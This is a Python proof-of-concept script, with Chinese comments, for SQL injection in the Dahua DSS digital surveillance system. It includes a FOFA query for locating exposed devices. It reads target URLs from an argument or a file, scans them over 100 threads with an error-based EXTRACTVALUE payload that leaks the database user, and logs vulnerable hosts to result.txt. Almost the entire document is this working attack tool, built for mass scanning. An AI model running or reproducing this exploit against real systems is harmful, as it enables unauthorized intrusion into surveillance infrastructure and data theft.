#大华 DSS 数字监控系统 group_saveGroupSQL 注入
#FOFA语法：app="dahua-DSS"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='大华 DSS 数字监控系统 group_saveGroupSQL 注入')
    parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parse.add_argument('-f','--file',dest='file',type=str,help='输入file名')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        pass
def poc(target):
    payload="/portal/attachment_clearTempFile.action?bean.RecId=1') AND EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e)) AND ('mYhO'='mYhO&bean.TabName=1"
    data=""
    proxy={
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}
    headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'close'
    }
    try:
        
        res1 = requests.post(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxy,data=data)
        if "EXTRACTVALUE" in res1.text:
                print(target+"存在sql注入")
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target+'\n')
    except Exception as e:
        pass

if __name__=='__main__':
    main()